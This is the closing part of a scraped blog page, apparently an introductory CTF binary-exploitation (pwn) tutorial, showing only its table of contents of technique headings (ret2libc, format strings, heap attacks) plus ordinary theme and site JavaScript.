href="#ret2shellcode-1"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2plt"><span class="toc-number">5.3.3.</span> <span class="toc-text">ret2plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">5.3.4.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">5.3.5.</span> <span class="toc-text">ret2dlresolve</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SROP"><span class="toc-number">5.3.6.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FSOP"><span class="toc-number">5.3.7.</span> <span class="toc-text">FSOP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81-Control-Flow-Hijack"><span class="toc-number">5.4.</span> <span class="toc-text">劫持控制流&#x2F;Control Flow Hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E9%87%91%E4%B8%9D%E9%9B%80-Stack-Canary"><span class="toc-number">5.5.</span> <span class="toc-text">栈金丝雀&#x2F;Stack Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E-Format-String-Vulnerability"><span class="toc-number">6.</span> <span class="toc-text">格式化字符串漏洞 Format String Vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">格式化字符串函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">格式化字符串函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.1.2.</span> <span class="toc-text">格式化字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">6.1.3.</span> <span class="toc-text">变量</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.2.</span> <span class="toc-text">格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%98%AF%E6%80%8E%E4%B9%88%E4%BC%A0%E8%BF%9B-printf-%E7%9A%84%EF%BC%8832-bit-%E5%92%8C-64-bit%EF%BC%89"><span class="toc-number">6.2.1.</span> <span class="toc-text">参数是怎么传进 printf 的（32-bit 和 64-bit）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#32-bit%EF%BC%88cdecl%EF%BC%89%E2%80%94%E2%80%94%E5%85%A8%E9%83%A8%E8%B5%B0%E6%A0%88"><span class="toc-number">6.2.1.1.</span> <span class="toc-text">32-bit（cdecl）——全部走栈</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x86-64%EF%BC%88System-V-ABI%EF%BC%89%E2%80%94%E2%80%94%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%98%E5%85%88-%E6%BA%A2%E5%87%BA%E5%88%B0%E6%A0%88"><span class="toc-number">6.2.1.2.</span> <span class="toc-text">x86-64（System V ABI）——寄存器优先 + 溢出到栈</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E4%BB%A5%E5%8F%8A%E5%81%8F%E5%B7%AE%E5%80%BC"><span class="toc-number">6.2.2.</span> <span class="toc-text">特殊情况以及偏差值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A1%A8%E7%8E%B0"><span class="toc-number">6.2.3.</span> <span class="toc-text">漏洞表现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit%E6%8A%80%E5%B7%A7"><span class="toc-number">6.3.</span> <span class="toc-text">Exploit技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%A0%88%E4%B8%8A%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">6.3.1.</span> <span class="toc-text">读取栈上的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">6.3.2.</span> <span class="toc-text">读取任意地址的字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">6.3.2.1.</span> <span class="toc-text">一般流程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5"><span class="toc-number">6.3.3.</span> <span class="toc-text">写入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B-1"><span class="toc-number">6.3.3.1.</span> <span class="toc-text">一般流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99-1-%E5%AD%97%E8%8A%82%EF%BC%88-hhn%EF%BC%89"><span class="toc-number">6.3.3.2.</span> <span class="toc-text">写 1 字节（%hhn）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fmtstr-payload"><span class="toc-number">6.3.3.3.</span> <span class="toc-text">fmtstr_payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8-Heap-Exploitation"><span class="toc-number">7.</span> <span class="toc-text">堆利用&#x2F;Heap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Glibc-2-31"><span class="toc-number">7.1.</span> <span class="toc-text">Glibc 2.31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Glibc-2-41"><span class="toc-number">7.2.</span> <span class="toc-text">Glibc 2.41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.</span> <span class="toc-text">攻击方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Fastbin-Tcache-FD-Corruption-FD-%E6%8C%87%E9%92%88%E7%AF%A1%E6%94%B9"><span class="toc-number">7.3.1.</span> <span class="toc-text">1. Fastbin&#x2F;Tcache FD Corruption (FD 指针篡改)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Size-Corruption-%E5%A4%A7%E5%B0%8F%E7%AF%A1%E6%94%B9-Overlapping-Chunks"><span class="toc-number">7.3.2.</span> <span class="toc-text">2. Size Corruption (大小篡改 &#x2F; Overlapping Chunks)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Smallbin-Consolidation-Smallbin-%E5%90%88%E5%B9%B6%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.3.</span> <span class="toc-text">3. Smallbin Consolidation (Smallbin 合并攻击)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E5%B7%A5%E5%85%B7"><span class="toc-number">7.4.</span> <span class="toc-text">推荐工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99"><span class="toc-number">7.5.</span> <span class="toc-text">学习资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8pwndbg%E5%91%BD%E4%BB%A4"><span class="toc-number">7.6.</span> <span class="toc-text">常用pwndbg命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E7%B1%BB"><span class="toc-number">8.</span> <span class="toc-text">题目分类</span></a></li></ol>
  </div>
</section>

  

</div>

  <!-- Custom Files side begin -->
  
  <!-- Custom Files side end -->
</aside>



        </div>
        
  
  <footer class="footer clearfix"  itemscope itemtype="https://schema.org.cn/WPFooter">
    <br><br>
    
      
        <div class="aplayer-container">
          


        </div>
      
    
      
        <br>
        <div class="social-wrapper" itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
          
            
          
            
          
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        Use
        <a href="https://github.com/volantis-x/hexo-theme-volantis/#6.0.0-alpha.1" target="_blank" class="codename">Volantis</a>
        as theme, total visits
          <span id="busuanzi_site_pv"><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
          times
        
      
    
      
        <div class='copyright'>
        <p><a href="/">Copyright © since 2017 XXX</a></p>

        </div>
      
    
    <!-- Custom Files footer begin-->
    
    <!-- Custom Files footer end-->
  </footer>


        <a id="s-top" class="fa-solid fa-arrow-up fa-fw" title="top"></a>
      </div>
    </div>
    <div>
      <script>
  /******************** volantis.dom ********************************/
  // 页面选择器 将dom对象缓存起来 see: /source/js/app.js etc.
  volantis.dom.bodyAnchor = volantis.dom.$(document.getElementById("safearea")); // 页面主体
  volantis.dom.topBtn = volantis.dom.$(document.getElementById('s-top')); // 向上
  volantis.dom.wrapper = volantis.dom.$(document.getElementById('wrapper')); // 整个导航栏
  volantis.dom.coverAnchor = volantis.dom.$(document.querySelector('#l_cover .cover-wrapper')); // 1个
  volantis.dom.switcher = volantis.dom.$(document.querySelector('#l_header .switcher .s-search')); // 搜索按钮   移动端 1个
  volantis.dom.header = volantis.dom.$(document.getElementById('l_header')); // 移动端导航栏
  volantis.dom.search = volantis.dom.$(document.querySelector('#l_header .m_search')); // 搜索框 桌面端 移动端 1个
  volantis.dom.mPhoneList = volantis.dom.$(document.querySelectorAll('#l_header .m-phone .list-v')); //  手机端 子菜单 多个
</script>

<script>
  
  volantis.css("https://unpkg.com/@fortawesome/fontawesome-free@6.6.0/css/all.min.css");
  
  
  
</script>

<!-- required -->


<!-- internal -->

<script src="/en/en/js/app.js"></script>




<!-- rightmenu要在darkmode之前（ToggleButton） darkmode要在comments之前（volantis.dark.push）-->

  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "color-scheme";
const rootElementDarkModeAttributeName = "color-scheme";
const setLS = (k, v) => {
    localStorage.setItem(k, v);
};
const removeLS = (k) => {
    localStorage.removeItem(k);
};
const getLS = (k) => {
    return localStorage.getItem(k);
};
const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};
const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};
const validColorModeKeys = {
  dark: true,
  light: true,
};
const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);
  getCustomDarkMode();
  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};
const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};
/**
 * get target mode
 */
 const getCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  if(currentSetting=="dark"){
    volantis.dark.mode="light";
  }else{
    volantis.dark.mode="dark";
  }
  // console.log(volantis.dark.mode)
};
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);
  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};
/**
 * 暗黑模式触发器
 */
volantis.dark.toggle=()=>{
  const mode = toggleCustomDarkMode();
  applyCustomDarkModeSettings(mode);
  // 使用 volantis.dark.push 方法传入volantis.dark.toggle回调函数 参见layout/_partial/scripts/global.ejs
  volantis.dark.method.toggle.start();
}
/**
 * bind event for toggle button
 */

function bindToggleButton() {
  var btn= document.querySelectorAll("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn")
  btn.forEach(function (e) {
    volantis.dom.$(e).on('click',volantis.dark.toggle);
  })
}
applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", ()=>{
  volantis.requestAnimationFrame(bindToggleButton)
});

const darkModelListeners={
  dark:(mediaQueryList )=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "dark";
    }
    volantis.dark.method.toggle.start();
  },
  light:(mediaQueryList)=>{
    if(mediaQueryList.matches){
      volantis.dark.mode = "light";
    }
    volantis.dark.method.toggle.start();
  }
}
window.matchMedia('(prefers-color-scheme: dark)').addListener(darkModelListeners.dark)
window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListeners.light)
</script>




<script>
  function loadIssuesJS() {
    
      const sites_api = document.getElementById('sites-api');
      if (sites_api != undefined && typeof SitesJS === 'undefined') {
        volantis.js("/en/js/plugins/tags/sites.js")
      }
    
    
      const friends_api = document.getElementById('friends-api');
      if (friends_api != undefined && typeof FriendsJS === 'undefined') {
        volantis.js("/en/js/plugins/tags/friends.js")
      }
    
    
      const contributors_api = document.getElementById('contributors-api');
      if (contributors_api != undefined && typeof ContributorsJS === 'undefined') {
        volantis.js("/en/js/plugins/tags/contributors.js")
      }
    
  };
  loadIssuesJS()
</script>




  <script defer src="https://unpkg.com/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: ["#"],
	maxRPS: 6,
	hoverDelay: 0
  };
</script>
<script defer src="https://unpkg.com/volantis-static@0.0.1660614606622/libs/flying-pages/flying-pages.min.js"></script>













  <script defer src="https://npm.onmicrosoft.cn/penndu@16.0.0/bsz.js"></script>


<!-- optional -->

  <script>
  async function loadSearchScript() {
    
        
    
    return volantis.js("/en/js/search/hexo.js");
  }

  function loadSearchService() {
    loadSearchScript();
    document.querySelectorAll(".input.u-search-input").forEach((e) => {
      e.removeEventListener("focus", loadSearchService, false);
    });

    document.querySelectorAll(".u-search-form").forEach((e) => {
      e.addEventListener("submit", (event) => {
        event.preventDefault();
      }, false);
    });
  }

  // 打开并搜索 字符串 s
  function OpenSearch(s) {
    if (typeof SearchService === 'undefined')
      loadSearchScript().then(() => {
        SearchService.setQueryText(s);
        SearchService.search();
      });
    else {
      SearchService.setQueryText(s);
      SearchService.search();
    }
  }

  // 访问含有 ?s=xxx  的链接时打开搜索 // 与搜索引擎 structured data 相关: /scripts/helpers/structured-data/lib/config.js
  if (window.location.search && /^\?s=/g.test(window.location.search)) {
    let queryText = decodeURI(window.location.search)
      .replace(/\ /g, "-")
      .replace(/^\?s=/g, "");
    OpenSearch(queryText);
  }

  // 搜索输入框获取焦点时加载搜索
  document.querySelectorAll(".input.u-search-input").forEach((e) => {
    e.addEventListener("focus", loadSearchService, false);
  });
</script>







  <script>



  function p_highlightjs_copyCode(){
    if (!(document.querySelector(".highlight .code pre") ||
      document.querySelector(".article pre code"))) {
      return;
    }
    VolantisApp.utilCopyCode(".highlight .code pre, .article pre code")
  }
  volantis.requestAnimationFrame(p_highlightjs_copyCode)

</script>








  <script>
  let imgs = ["/background/wallhaven-jewjp5_2560x1080.png"];
  let index = 0;
  let IntervalParallax = null;

  function parallax(){
    let ParallaxWindow = document.querySelector("#parallax-window");
    
      ParallaxWindow = document.querySelector("html");
    
    Parallax.window = ParallaxWindow;
    Parallax.options.fade = 1500;
    Parallax.cache = 1;
    next_parallax();
    Parallax.init();
    if (imgs.length>1) {
      IntervalParallax = setInterval(function () {
        next_parallax();
      }, '31536000000');
    }
  }

  function next_parallax() {
    if (typeof Parallax == "undefined") {
      return
    }
    
    if (imgs.length>=1) {
      Parallax.options.src = imgs[index % imgs.length];
      Parallax.start();
      index++;
      if (Parallax.cache) {
        fetch(imgs[index % imgs.length] +"?t=" + new Date().getTime());
        if (index == imgs.length) {
          Parallax.cache = 0;
        }
      }
    }
  }
  var runningOnBrowser = typeof window !== "undefined";
  var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
  if (!isBot) {
    volantis.js('/en/js/plugins/parallax.js').then(()=>{
      parallax()
    })
  }
</script>




  <script>
  function load_swiper() {
    if (!document.querySelectorAll(".swiper-container")[0]) return;
    volantis.css("https://unpkg.com/swiper@11.1.14/swiper-bundle.min.css");
    volantis.js("https://unpkg.com/swiper@11.1.14/swiper-bundle.min.js").then(() => {
      p_swiper();
    });
  }

  load_swiper();

  function p_swiper() {
    volantis.swiper = new Swiper('.swiper-container', {
      slidesPerView: 'auto',
      spaceBetween: 8,
      centeredSlides: true,
      loop: true,
      pagination: {
        el: '.swiper-pagination',
        clickable: true,
      },
      navigation: {
        nextEl: '.swiper-button-next',
        prevEl: '.swiper-button-prev',
      },
    });
  }

</script>



  <script>
  volantis.css("https://unpkg.com/pace-js@1.2.4/themes/blue/pace-theme-minimal.css");
  volantis.js("https://unpkg.com/pace-js@1.2.4/pace.min.js").then(() => {
    Pace.options.restartOnPushState = false;
    // 阅读进度
    volantis.scroll.push(() => {
      Pace.stop();
      Pace.trigger('start');
      Pace.bar.update(volantis.scroll.progress() * 100);
      document.body.className = document.body.className.replaceAll("pace-running ","");
    },"阅读进度")
    // todo：配置项开关, 哪些页面添加阅读进度
  })
</script>




<script>
  function listenSidebarTOC() {
    const navItems = document.querySelectorAll(".toc li");
    if (!navItems.length) return;
    const targets = []
    const sections = Array.from(navItems).forEach((element) => {
      const link = element.querySelector(".toc-link");
      const target = document.getElementById(
        link.getAttribute("href") ? decodeURI(link.getAttribute("href")).replace("#", "") : link.getAttribute("toc-action").split("toc-")[1] // 兼容 hexo-blog-encrypt
      );
      targets.push(target)
      // 解除 a 标签 href 的 锚点定位, a 标签 href 的 锚点定位 会随机启用?? 产生错位???
      if (link.getAttribute("href")) {
        link.setAttribute("toc-action", "toc-" + decodeURI(link.getAttribute("href")).replace("#", ""))
        link.removeAttribute("href")
      }
      // 配置 点击 触发新的锚点定位
      if (target && target.id) {
        link.addEventListener("click", (event) => {
          event.preventDefault();
          // 这里的 addTop 是通过错位使得 toc 自动展开.
          volantis.scroll.to(target, { addTop: 5, observer: true })
          // Anchor id
          history.pushState(null, document.title, "#" + target.id);
        });
      }
      return target;
    });

    function activateNavByIndex(target) {
      if (target.classList.contains("active-current")) return;

      document.querySelectorAll(".toc .active").forEach((element) => {
        element.classList.remove("active", "active-current");
      });
      target.classList.add("active", "active-current");
      let parent = target.parentNode;
      while (!parent.matches(".toc")) {
        if (parent.matches("li")) parent.classList.add("active");
        parent = parent.parentNode;
      }
    }

    // 方案一：
    volantis.activateNavIndex = 0
    activateNavByIndex(navItems[volantis.activateNavIndex])
    if (targets[0]) {
      volantis.scroll.push(() => {
        if (targets[0].getBoundingClientRect().top >= 0) {
          volantis.activateNavIndex = 0
        } else if (targets[targets.length - 1].getBoundingClientRect().top < 0) {
          volantis.activateNavIndex = targets.length - 1
        } else {
          for (let index = 0; index < targets.length; index++) {
            const target0 = targets[index];
            const target1 = targets[(index + 1) % targets.length];
            if (target0.getBoundingClientRect().top < 0 && target1.getBoundingClientRect().top >= 0) {
              volantis.activateNavIndex = index
              break;
            }
          }
        }
        activateNavByIndex(navItems[volantis.activateNavIndex])
      })
    }

    // 方案二：
    // IntersectionObserver 不是完美精确到像素级别 也不是低延时性的
    // function findIndex(entries) {
    //   let index = 0;
    //   let entry = entries[index];
    //   if (entry.boundingClientRect.top > 0) {
    //     index = sections.indexOf(entry.target);
    //     return index === 0 ? 0 : index - 1;
    //   }
    //   for (; index < entries.length; index++) {
    //     if (entries[index].boundingClientRect.top <= 0) {
    //       entry = entries[index];
    //     } else {
    //       return sections.indexOf(entry.target);
    //     }
    //   }
    //   return sections.indexOf(entry.target);
    // }
    // function createIntersectionObserver(marginTop) {
    //   marginTop = Math.floor(marginTop + 10000);
    //   let intersectionObserver = new IntersectionObserver(
    //     (entries, observe) => {
    //       let scrollHeight = document.documentElement.scrollHeight;
    //       if (scrollHeight > marginTop) {
    //         observe.disconnect();
    //         createIntersectionObserver(scrollHeight);
    //         return;
    //       }
    //       let index = findIndex(entries);
    //       activateNavByIndex(navItems[index]);
    //     }, {
    //       rootMargin: marginTop + "px 0px -100% 0px",
    //       threshold: 0,
    //     }
    //   );
    //   sections.forEach((element) => {
    //     element && intersectionObserver.observe(element);
    //   });
    // }
    // createIntersectionObserver(document.documentElement.scrollHeight);
  }

  document.addEventListener("DOMContentLoaded", () => {
    volantis.requestAnimationFrame(listenSidebarTOC)
  });
</script>





<script>
  document.onreadystatechange = function () {
    if (document.readyState == 'complete') {
      // 页面加载完毕 样式加载失败，或是当前网速慢，或是开启了省流模式
      const { saveData, effectiveType } = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {}
      if (getComputedStyle(document.querySelector("#safearea"), null)["display"] == "none" || saveData || /2g/.test(effectiveType)) {
        document.querySelectorAll(".reveal").forEach(function (e) {
          e.style["opacity"] = "1";
        });
        document.querySelector("#safearea").style["display"] = "block";
      }
    }
  }
</script>


  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/","sameAs":["https://github.com/volantis-x"],"description":"hi"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://archer-baiyi.github.io/en/en/","name":"Hexo"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/en/en/categories/CTF/","name":"CTF"}},{"@type":"ListItem","position":2,"item":{"@id":"https://archer-baiyi.github.io/en/en/categories/CTF/Pwn/","name":"Pwn"}},{"@type":"ListItem","position":3,"item":{"@id":"https://archer-baiyi.github.io/en/en/2025/05/12/CTF/Pwn/Pwn入门/","name":"CTF Pwn 入门"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","keywords":null,"description":"hi","author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/","description":"hi"},"publisher":{"@type":"Organization","name":"Hexo","url":"https://archer-baiyi.github.io/en/en/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://archer-baiyi.github.io/en?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"CTF Pwn 入门","description":"零基础Pwn入门","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/"},"author":{"@type":"Person","name":null,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://archer-baiyi.github.io/en/en/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","wordCount":8,"datePublished":"2025-05-12T15:01:08.000Z","dateModified":"2026-02-06T23:43:56.842Z","articleSection":"CTF","keywords":"Pwn","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>




    </div>
    
    <script>
      (function() {
        // 定义修复核心逻辑
        function checkAndFixTOC() {
          var tocDiv = document.getElementById('toc-div');
          
          if (tocDiv) {
            // 1. 检查 TOC 里面是不是真的有内容（防止把空目录显示出来）
            var tocList = tocDiv.querySelector('ol.toc');
            var hasContent = tocList && tocList.children.length > 0;
            
            // 2. 如果有内容，但被隐藏了 (display: none)，则强制显示
            // 这里检查内联样式 style.display，因为它优先级最高
            if (hasContent && tocDiv.style.display === 'none') {
              console.log('Volantis Fix: 检测到目录被误杀，正在强制复活...');
              
              // 使用 cssText 赋予最高优先级 !important
              tocDiv.style.cssText = "display: block !important; opacity: 1 !important; visibility: visible !important;";
              
              // 3. 告诉主题重新计算布局（防止侧边栏塌陷）
              window.dispatchEvent(new Event('resize'));
              window.dispatchEvent(new Event('scroll'));
              
              // 4. 重启目录高亮监听
              if (typeof listenSidebarTOC === 'function') {
                listenSidebarTOC();
              }
            }
          }
        }

        // 策略 A: 监听解密事件 (依然保留，作为第一道防线)
        window.addEventListener('hexo-blog-encrypt:success', function() {
          checkAndFixTOC();
          setTimeout(checkAndFixTOC, 200); // 补刀
        });

        // 策略 B: 暴力轮询 (每 1 秒检查一次，作为终极防线)
        // 只要你在当前页面，这个定时器就会一直巡逻，确保目录不会莫名其妙消失
        setInterval(checkAndFixTOC, 1000);
        
      })();
    </script>
    </body>
</html>